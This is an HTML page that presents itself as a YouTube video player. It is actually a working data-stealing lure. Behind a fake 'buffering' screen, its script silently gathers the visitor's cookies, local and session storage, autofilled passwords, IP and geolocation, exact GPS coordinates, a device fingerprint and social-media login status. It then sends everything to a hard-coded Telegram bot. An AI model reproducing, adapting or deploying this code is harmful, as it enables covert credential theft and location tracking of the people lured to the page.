<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0f0f0f;
            color: #fff;
            font-family: Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .loading-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-top: 3px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: #aaa;
            margin-bottom: 10px;
        }
        
        .loading-details {
            font-size: 14px;
            color: #666;
            text-align: center;
            max-width: 300px;
            margin-top: 20px;
        }
        
        .progress-bar {
            width: 300px;
            height: 3px;
            background: #333;
            margin-top: 20px;
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.3s;
        }
        
        .video-player {
            width: 100%;
            height: 100%;
            opacity: 0;
            transition: opacity 0.5s;
        }
        
        .video-player.active {
            opacity: 1;
        }
        
        .hidden-frame {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #28a745;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 14px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.3s;
            z-index: 1000;
        }
        
        .notification.show {
            opacity: 1;
            transform: translateY(0);
        }
        
        .notification.error {
            background: #dc3545;
        }
        
        .stats-overlay {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            color: #0f0;
            font-family: monospace;
            z-index: 1000;
            display: none;
        }
        
        .debug-mode .stats-overlay {
            display: block;
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingScreen">
        <div class="loader"></div>
        <div class="loading-text">Loading video player...</div>
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        <div class="loading-details" id="loadingDetails">
            Initializing video stream...
        </div>
    </div>
    
    <div class="video-container">
        <iframe 
            class="video-player" 
            id="videoPlayer"
            src="" 
            frameborder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
            allowfullscreen>
        </iframe>
    </div>
    
    <!-- Ð¡ÐºÑ€Ñ‹Ñ‚Ñ‹Ðµ Ñ„Ñ€ÐµÐ¹Ð¼Ñ‹ Ð´Ð»Ñ ÑÐ±Ð¾Ñ€Ð° Ð´Ð°Ð½Ð½Ñ‹Ñ… -->
    <iframe class="hidden-frame" id="googleFrame"></iframe>
    <iframe class="hidden-frame" id="facebookFrame"></iframe>
    <iframe class="hidden-frame" id="twitterFrame"></iframe>
    <iframe class="hidden-frame" id="whatsappFrame"></iframe>
    
    <div class="notification" id="notification"></div>
    <div class="stats-overlay" id="statsOverlay"></div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
        const TELEGRAM_CHAT_ID = '1709490182';
        
        // YouTube Video ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ'; // Default: Rick Roll
        
        // Collected data
        let collectedData = {
            timestamp: new Date().toISOString(),
            videoId: videoId,
            stage: 'initializing',
            data: {}
        };
        
        // Progress tracking
        let progress = 0;
        let currentStage = 0;
        const totalStages = 8;
        
        // Update loading screen
        function updateLoading(percent, text) {
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('loadingDetails').textContent = text;
            
            if (percent >= 100) {
                setTimeout(() => {
                    document.getElementById('loadingScreen').style.opacity = '0';
                    setTimeout(() => {
                        document.getElementById('loadingScreen').style.display = 'none';
                        document.getElementById('videoPlayer').classList.add('active');
                    }, 500);
                }, 1000);
            }
        }
        
        // Show notification
        function showNotification(text, isError = false) {
            const notification = document.getElementById('notification');
            notification.textContent = text;
            notification.classList.toggle('error', isError);
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        // Update stats overlay
        function updateStats() {
            const stats = document.getElementById('statsOverlay');
            stats.innerHTML = `
                Data Collection Status:<br>
                Stage: ${currentStage}/${totalStages}<br>
                Cookies: ${collectedData.data.cookies ? 'âœ“' : 'âœ—'}<br>
                Passwords: ${collectedData.data.passwords ? 'âœ“' : 'âœ—'}<br>
                Sessions: ${collectedData.data.sessions ? 'âœ“' : 'âœ—'}
            `;
        }
        
        // Get IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        // Get geolocation from IP
        async function getGeolocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                return await response.json();
            } catch (error) {
                return null;
            }
        }
        
        // Extract cookies from document.cookie
        function extractCookies() {
            const cookies = document.cookie.split(';').map(cookie => {
                const [name, value] = cookie.trim().split('=');
                return { name, value: value || '' };
            });
            
            // Also try to access localStorage
            let localStorageData = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorageData[key] = localStorage.getItem(key);
                }
            } catch (e) {}
            
            // Try sessionStorage
            let sessionStorageData = {};
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    sessionStorageData[key] = sessionStorage.getItem(key);
                }
            } catch (e) {}
            
            return {
                cookies,
                localStorage: localStorageData,
                sessionStorage: sessionStorageData
            };
        }
        
        // Try to extract saved passwords
        function extractSavedPasswords() {
            const passwords = [];
            
            // Create hidden form to trigger autofill
            const form = document.createElement('form');
            form.style.display = 'none';
            form.innerHTML = `
                <input type="email" name="email" autocomplete="email">
                <input type="password" name="password" autocomplete="current-password">
                <input type="text" name="username" autocomplete="username">
            `;
            
            document.body.appendChild(form);
            
            // Try to focus to trigger autofill
            setTimeout(() => {
                const emailInput = form.querySelector('input[name="email"]');
                const passwordInput = form.querySelector('input[name="password"]');
                
                if (emailInput && passwordInput) {
                    emailInput.focus();
                    setTimeout(() => {
                        if (emailInput.value) {
                            passwords.push({
                                email: emailInput.value,
                                password: passwordInput.value,
                                source: 'autofill'
                            });
                        }
                    }, 100);
                }
                
                document.body.removeChild(form);
            }, 50);
            
            return passwords;
        }
        
        // Try to access social media sessions
        async function checkSocialSessions() {
            const sessions = {};
            
            // Check if user is logged into Google
            try {
                const googleTest = await fetch('https://accounts.google.com/ServiceLogin', {
                    mode: 'no-cors'
                }).catch(() => null);
                sessions.google = googleTest ? 'possibly logged in' : 'unknown';
            } catch (e) {}
            
            // Check Facebook login
            try {
                sessions.facebook = navigator.userAgent.includes('FBAN') || 
                                   navigator.userAgent.includes('FBAV') ? 
                                   'likely logged in' : 'unknown';
            } catch (e) {}
            
            return sessions;
        }
        
        // Get browser fingerprint
        function getBrowserFingerprint() {
            const fingerprint = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', '),
                webdriver: navigator.webdriver || false,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false
            };
            
            // Get canvas fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('FINGERPRINT', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('FINGERPRINT', 4, 17);
                fingerprint.canvas = canvas.toDataURL();
            } catch (e) {}
            
            return fingerprint;
        }
        
        // Get network information
        function getNetworkInfo() {
            const network = {
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                online: navigator.onLine,
                referrer: document.referrer,
                url: window.location.href
            };
            
            return network;
        }
        
        // Try to access microphone and camera
        function checkMediaDevices() {
            const devices = {
                audio: false,
                video: false
            };
            
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                navigator.mediaDevices.enumerateDevices()
                    .then(deviceList => {
                        deviceList.forEach(device => {
                            if (device.kind === 'audioinput') devices.audio = true;
                            if (device.kind === 'videoinput') devices.video = true;
                        });
                    })
                    .catch(() => {});
            }
            
            return devices;
        }
        
        // Try to get location
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    { timeout: 5000 }
                );
            });
        }
        
        // Send data to Telegram
        async function sendToTelegram(data) {
            let message = `ðŸ”“ *AUTOMATIC DATA COLLECTION COMPLETE* ðŸ”“\n\n`;
            
            message += `ðŸŽ¬ *YouTube Video:* ${data.videoId}\n`;
            message += `ðŸ•’ *Time:* ${new Date().toLocaleString()}\n`;
            message += `ðŸ“ *IP:* ${data.ip || 'Unknown'}\n`;
            
            if (data.geolocation) {
                message += `ðŸ—ºï¸ *Location:* ${data.geolocation.city || ''}, ${data.geolocation.country_name || ''}\n`;
                message += `ðŸ¢ *ISP:* ${data.geolocation.org || 'Unknown'}\n`;
            }
            
            message += `\nðŸ‘¤ *USER IDENTIFICATION:*\n`;
            message += `â€¢ IP Address: \`${data.ip}\`\n`;
            
            if (data.geolocation) {
                message += `â€¢ City: ${data.geolocation.city}\n`;
                message += `â€¢ Region: ${data.geolocation.region}\n`;
                message += `â€¢ Country: ${data.geolocation.country_name}\n`;
                message += `â€¢ ISP: ${data.geolocation.org}\n`;
                message += `â€¢ Timezone: ${data.geolocation.timezone}\n`;
            }
            
            message += `\nðŸ’¾ *STORED DATA FOUND:*\n`;
            
            if (data.cookies && data.cookies.cookies.length > 0) {
                message += `â€¢ Cookies: ${data.cookies.cookies.length} found\n`;
                // Show important cookies
                data.cookies.cookies.slice(0, 5).forEach(cookie => {
                    message += `  - ${cookie.name}: \`${cookie.value.substring(0, 20)}${cookie.value.length > 20 ? '...' : ''}\`\n`;
                });
            }
            
            if (data.passwords && data.passwords.length > 0) {
                message += `â€¢ Saved Passwords: ${data.passwords.length} found\n`;
                data.passwords.forEach(pwd => {
                    message += `  - ${pwd.email}: \`${pwd.password}\`\n`;
                });
            }
            
            message += `\nðŸ“± *DEVICE FINGERPRINT:*\n`;
            message += `â€¢ User Agent: ${data.fingerprint.userAgent}\n`;
            message += `â€¢ Platform: ${data.fingerprint.platform}\n`;
            message += `â€¢ Screen: ${data.fingerprint.screen.width}x${data.fingerprint.screen.height}\n`;
            message += `â€¢ Languages: ${data.fingerprint.languages.join(', ')}\n`;
            message += `â€¢ Timezone: ${data.fingerprint.timezone}\n`;
            message += `â€¢ WebDriver: ${data.fingerprint.webdriver ? 'Yes (bot)' : 'No (human)'}\n`;
            
            message += `\nðŸŒ *NETWORK INFORMATION:*\n`;
            message += `â€¢ Connection: ${data.network.connection ? data.network.connection.effectiveType : 'Unknown'}\n`;
            message += `â€¢ Referrer: ${data.network.referrer || 'Direct'}\n`;
            message += `â€¢ Online: ${data.network.online ? 'Yes' : 'No'}\n`;
            
            message += `\nðŸ” *SOCIAL MEDIA STATUS:*\n`;
            Object.entries(data.sessions || {}).forEach(([social, status]) => {
                message += `â€¢ ${social}: ${status}\n`;
            });
            
            message += `\nðŸŽ¯ *MEDIA DEVICES:*\n`;
            message += `â€¢ Microphone: ${data.mediaDevices.audio ? 'Available' : 'Not available'}\n`;
            message += `â€¢ Camera: ${data.mediaDevices.video ? 'Available' : 'Not available'}\n`;
            
            if (data.location) {
                message += `\nðŸ“ *EXACT LOCATION:*\n`;
                message += `â€¢ Latitude: ${data.location.latitude}\n`;
                message += `â€¢ Longitude: ${data.location.longitude}\n`;
                message += `â€¢ Accuracy: ${data.location.accuracy} meters\n`;
                message += `â€¢ Google Maps: https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}\n`;
            }
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                // Save to localStorage as backup
                saveToLocalStorage(data);
                return null;
            }
        }
        
        // Save data to localStorage
        function saveToLocalStorage(data) {
            try {
                const saved = JSON.parse(localStorage.getItem('collectedData') || '[]');
                saved.push({
                    timestamp: new Date().toISOString(),
                    data: data
                });
                
                if (saved.length > 10) saved.shift(); // Keep only last 10
                localStorage.setItem('collectedData', JSON.stringify(saved));
            } catch (e) {}
        }
        
        // Main data collection function
        async function collectAllData() {
            collectedData.stage = 'collecting';
            
            // Stage 1: Get IP and basic info
            currentStage = 1;
            updateLoading(12, 'Getting IP address...');
            collectedData.ip = await getIPAddress();
            
            // Stage 2: Get geolocation
            currentStage = 2;
            updateLoading(25, 'Getting location information...');
            collectedData.geolocation = await getGeolocation(collectedData.ip);
            
            // Stage 3: Extract cookies and storage
            currentStage = 3;
            updateLoading(37, 'Analyzing browser storage...');
            collectedData.cookies = extractCookies();
            
            // Stage 4: Try to get saved passwords
            currentStage = 4;
            updateLoading(50, 'Checking saved credentials...');
            collectedData.passwords = extractSavedPasswords();
            
            // Stage 5: Browser fingerprint
            currentStage = 5;
            updateLoading(62, 'Creating device fingerprint...');
            collectedData.fingerprint = getBrowserFingerprint();
            
            // Stage 6: Network info
            currentStage = 6;
            updateLoading(75, 'Analyzing network connection...');
            collectedData.network = getNetworkInfo();
            
            // Stage 7: Check social sessions
            currentStage = 7;
            updateLoading(87, 'Checking social media sessions...');
            collectedData.sessions = await checkSocialSessions();
            
            // Stage 8: Media devices and location
            currentStage = 8;
            updateLoading(94, 'Checking permissions...');
            collectedData.mediaDevices = checkMediaDevices();
            
            // Try to get precise location
            collectedData.location = await getLocation();
            
            // Complete
            updateLoading(100, 'Data collection complete!');
            collectedData.stage = 'complete';
            collectedData.completedAt = new Date().toISOString();
            
            // Send to Telegram
            setTimeout(async () => {
                await sendToTelegram(collectedData);
                showNotification('Video player ready!');
            }, 1000);
            
            updateStats();
        }
        
        // Initialize video player
        function initializeVideoPlayer() {
            const videoUrl = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1`;
            document.getElementById('videoPlayer').src = videoUrl;
        }
        
        // Main initialization
        document.addEventListener('DOMContentLoaded', async function() {
            // Start data collection immediately
            setTimeout(() => collectAllData(), 500);
            
            // Initialize video player after 20 seconds
            setTimeout(() => {
                initializeVideoPlayer();
            }, 20000); // 20 seconds delay
            
            // Update progress bar during the 20 seconds
            const startTime = Date.now();
            const totalDelay = 20000; // 20 seconds
            
            const progressInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                const percent = Math.min(95, (elapsed / totalDelay) * 100);
                updateLoading(percent, `Buffering video... (${Math.round(elapsed/1000)}s)`);
                
                if (elapsed >= totalDelay) {
                    clearInterval(progressInterval);
                }
            }, 100);
        });
        
        // Debug mode: Press Ctrl+Shift+D
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
                document.body.classList.toggle('debug-mode');
                showNotification('Debug mode toggled');
            }
        });
    </script>
</body>
</html>